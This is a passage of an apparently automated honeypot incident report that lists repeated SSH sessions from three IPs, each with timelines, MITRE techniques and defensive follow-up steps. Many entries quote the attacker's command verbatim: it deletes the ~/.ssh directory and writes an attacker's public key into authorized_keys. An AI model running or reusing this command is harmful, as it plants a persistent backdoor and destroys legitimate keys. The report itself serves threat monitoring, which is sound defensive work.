| `2026-04-20 21:27:35` | `cowrie.command.failed` |
| `2026-04-20 21:27:35` | `cowrie.log.closed` |
| `2026-04-20 21:27:35` | `cowrie.session.params` |
| `2026-04-20 21:27:35` | `cowrie.command.input` |
| `2026-04-20 21:27:36` | `cowrie.session.file_download` |
| `2026-04-20 21:27:36` | `cowrie.log.closed` |
| `2026-04-20 21:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d68454e4048

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:27 |
| **Last Seen** | 2026-04-20 21:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:27:38` | `cowrie.session.connect` |
| `2026-04-20 21:27:38` | `cowrie.client.version` |
| `2026-04-20 21:27:38` | `cowrie.client.kex` |
| `2026-04-20 21:27:38` | `cowrie.login.success` |
| `2026-04-20 21:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a13759008ab

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:28 |
| **Last Seen** | 2026-04-20 21:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:28:02` | `cowrie.session.connect` |
| `2026-04-20 21:28:02` | `cowrie.client.version` |
| `2026-04-20 21:28:03` | `cowrie.client.kex` |
| `2026-04-20 21:28:04` | `cowrie.login.success` |
| `2026-04-20 21:28:04` | `cowrie.session.params` |
| `2026-04-20 21:28:04` | `cowrie.command.input` |
| `2026-04-20 21:28:04` | `cowrie.command.failed` |
| `2026-04-20 21:28:04` | `cowrie.log.closed` |
| `2026-04-20 21:28:05` | `cowrie.session.params` |
| `2026-04-20 21:28:05` | `cowrie.command.input` |
| `2026-04-20 21:28:05` | `cowrie.session.file_download` |
| `2026-04-20 21:28:05` | `cowrie.log.closed` |
| `2026-04-20 21:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28e6647c81f9

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:28 |
| **Last Seen** | 2026-04-20 21:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:28:08` | `cowrie.session.connect` |
| `2026-04-20 21:28:08` | `cowrie.client.version` |
| `2026-04-20 21:28:08` | `cowrie.client.kex` |
| `2026-04-20 21:28:09` | `cowrie.login.success` |
| `2026-04-20 21:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79af08d72dcd

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:29 |
| **Last Seen** | 2026-04-20 21:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:29:45` | `cowrie.session.connect` |
| `2026-04-20 21:29:45` | `cowrie.client.version` |
| `2026-04-20 21:29:46` | `cowrie.client.kex` |
| `2026-04-20 21:29:47` | `cowrie.login.success` |
| `2026-04-20 21:29:47` | `cowrie.session.params` |
| `2026-04-20 21:29:47` | `cowrie.command.input` |
| `2026-04-20 21:29:47` | `cowrie.command.failed` |
| `2026-04-20 21:29:47` | `cowrie.log.closed` |
| `2026-04-20 21:29:48` | `cowrie.session.params` |
| `2026-04-20 21:29:48` | `cowrie.command.input` |
| `2026-04-20 21:29:48` | `cowrie.session.file_download` |
| `2026-04-20 21:29:48` | `cowrie.log.closed` |
| `2026-04-20 21:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96d540ce8aad

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:29 |
| **Last Seen** | 2026-04-20 21:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:29:51` | `cowrie.session.connect` |
| `2026-04-20 21:29:51` | `cowrie.client.version` |
| `2026-04-20 21:29:51` | `cowrie.client.kex` |
| `2026-04-20 21:29:52` | `cowrie.login.success` |
| `2026-04-20 21:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9569236cab79

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:30 |
| **Last Seen** | 2026-04-20 21:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:30:54` | `cowrie.session.connect` |
| `2026-04-20 21:30:54` | `cowrie.client.version` |
| `2026-04-20 21:30:54` | `cowrie.client.kex` |
| `2026-04-20 21:30:55` | `cowrie.login.success` |
| `2026-04-20 21:30:56` | `cowrie.session.params` |
| `2026-04-20 21:30:56` | `cowrie.command.input` |
| `2026-04-20 21:30:56` | `cowrie.command.failed` |
| `2026-04-20 21:30:56` | `cowrie.log.closed` |
| `2026-04-20 21:30:56` | `cowrie.session.params` |
| `2026-04-20 21:30:56` | `cowrie.command.input` |
| `2026-04-20 21:30:56` | `cowrie.session.file_download` |
| `2026-04-20 21:30:56` | `cowrie.log.closed` |
| `2026-04-20 21:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4982bd30c59

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:30 |
| **Last Seen** | 2026-04-20 21:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:30:57` | `cowrie.session.connect` |
| `2026-04-20 21:30:57` | `cowrie.client.version` |
| `2026-04-20 21:30:58` | `cowrie.client.kex` |
| `2026-04-20 21:30:58` | `cowrie.login.success` |
| `2026-04-20 21:30:58` | `cowrie.session.params` |
| `2026-04-20 21:30:58` | `cowrie.command.input` |
| `2026-04-20 21:30:58` | `cowrie.command.failed` |
| `2026-04-20 21:30:59` | `cowrie.log.closed` |
| `2026-04-20 21:30:59` | `cowrie.session.params` |
| `2026-04-20 21:30:59` | `cowrie.command.input` |
| `2026-04-20 21:30:59` | `cowrie.session.file_download` |
| `2026-04-20 21:30:59` | `cowrie.log.closed` |
| `2026-04-20 21:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-391bf9b11643

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:30 |
| **Last Seen** | 2026-04-20 21:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:30:59` | `cowrie.session.connect` |
| `2026-04-20 21:30:59` | `cowrie.client.version` |
| `2026-04-20 21:30:59` | `cowrie.client.kex` |
| `2026-04-20 21:31:00` | `cowrie.login.success` |
| `2026-04-20 21:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c64b3101f94

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:31 |
| **Last Seen** | 2026-04-20 21:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:31:01` | `cowrie.session.connect` |
| `2026-04-20 21:31:01` | `cowrie.client.version` |
| `2026-04-20 21:31:01` | `cowrie.client.kex` |
| `2026-04-20 21:31:02` | `cowrie.login.success` |
| `2026-04-20 21:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bdb2aaf4460

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:32 |
| **Last Seen** | 2026-04-20 21:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:32:38` | `cowrie.session.connect` |
| `2026-04-20 21:32:38` | `cowrie.client.version` |
| `2026-04-20 21:32:38` | `cowrie.client.kex` |
| `2026-04-20 21:32:39` | `cowrie.login.success` |
| `2026-04-20 21:32:39` | `cowrie.session.params` |
| `2026-04-20 21:32:39` | `cowrie.command.input` |
| `2026-04-20 21:32:39` | `cowrie.command.failed` |
| `2026-04-20 21:32:39` | `cowrie.log.closed` |
| `2026-04-20 21:32:40` | `cowrie.session.params` |
| `2026-04-20 21:32:40` | `cowrie.command.input` |
| `2026-04-20 21:32:40` | `cowrie.session.file_download` |
| `2026-04-20 21:32:40` | `cowrie.log.closed` |
| `2026-04-20 21:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f0cb6231838

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:32 |
| **Last Seen** | 2026-04-20 21:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:32:42` | `cowrie.session.connect` |
| `2026-04-20 21:32:42` | `cowrie.client.version` |
| `2026-04-20 21:32:42` | `cowrie.client.kex` |
| `2026-04-20 21:32:43` | `cowrie.login.success` |
| `2026-04-20 21:32:43` | `cowrie.session.params` |
| `2026-04-20 21:32:43` | `cowrie.command.input` |
| `2026-04-20 21:32:43` | `cowrie.command.failed` |
| `2026-04-20 21:32:43` | `cowrie.log.closed` |
| `2026-04-20 21:32:44` | `cowrie.session.params` |
| `2026-04-20 21:32:44` | `cowrie.command.input` |
| `2026-04-20 21:32:44` | `cowrie.session.file_download` |
| `2026-04-20 21:32:44` | `cowrie.log.closed` |
| `2026-04-20 21:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e4de31fa8ea

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:32 |
| **Last Seen** | 2026-04-20 21:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:32:42` | `cowrie.session.connect` |
| `2026-04-20 21:32:42` | `cowrie.client.version` |
| `2026-04-20 21:32:42` | `cowrie.client.kex` |
| `2026-04-20 21:32:43` | `cowrie.login.success` |
| `2026-04-20 21:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e6737db95a

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:32 |
| **Last Seen** | 2026-04-20 21:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:32:47` | `cowrie.session.connect` |
| `2026-04-20 21:32:47` | `cowrie.client.version` |
| `2026-04-20 21:32:47` | `cowrie.client.kex` |
| `2026-04-20 21:32:47` | `cowrie.login.success` |
| `2026-04-20 21:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-854eaf5ffa7c

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:33 |
| **Last Seen** | 2026-04-20 21:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:33:23` | `cowrie.session.connect` |
| `2026-04-20 21:33:23` | `cowrie.client.version` |
| `2026-04-20 21:33:23` | `cowrie.client.kex` |
| `2026-04-20 21:33:24` | `cowrie.login.success` |
| `2026-04-20 21:33:24` | `cowrie.session.params` |
| `2026-04-20 21:33:24` | `cowrie.command.input` |
| `2026-04-20 21:33:24` | `cowrie.command.failed` |
| `2026-04-20 21:33:24` | `cowrie.log.closed` |
| `2026-04-20 21:33:25` | `cowrie.session.params` |
| `2026-04-20 21:33:25` | `cowrie.command.input` |
| `2026-04-20 21:33:25` | `cowrie.session.file_download` |
| `2026-04-20 21:33:25` | `cowrie.log.closed` |
| `2026-04-20 21:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1542a5806de7

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:33 |
| **Last Seen** | 2026-04-20 21:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:33:29` | `cowrie.session.connect` |
| `2026-04-20 21:33:29` | `cowrie.client.version` |
| `2026-04-20 21:33:29` | `cowrie.client.kex` |
| `2026-04-20 21:33:30` | `cowrie.login.success` |
| `2026-04-20 21:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77c12f1f04db

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:34 |
| **Last Seen** | 2026-04-20 21:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:34:18` | `cowrie.session.connect` |
| `2026-04-20 21:34:18` | `cowrie.client.version` |
| `2026-04-20 21:34:18` | `cowrie.client.kex` |
| `2026-04-20 21:34:19` | `cowrie.login.success` |
| `2026-04-20 21:34:19` | `cowrie.session.params` |
| `2026-04-20 21:34:19` | `cowrie.command.input` |
| `2026-04-20 21:34:19` | `cowrie.command.failed` |
| `2026-04-20 21:34:19` | `cowrie.log.closed` |
| `2026-04-20 21:34:19` | `cowrie.session.params` |
| `2026-04-20 21:34:19` | `cowrie.command.input` |
| `2026-04-20 21:34:19` | `cowrie.session.file_download` |
| `2026-04-20 21:34:19` | `cowrie.log.closed` |
| `2026-04-20 21:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28aabe2ef313

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:34 |
| **Last Seen** | 2026-04-20 21:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:34:21` | `cowrie.session.connect` |
| `2026-04-20 21:34:21` | `cowrie.client.version` |
| `2026-04-20 21:34:22` | `cowrie.client.kex` |
| `2026-04-20 21:34:22` | `cowrie.login.success` |
| `2026-04-20 21:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd9a38af8637

| Field | Detail |
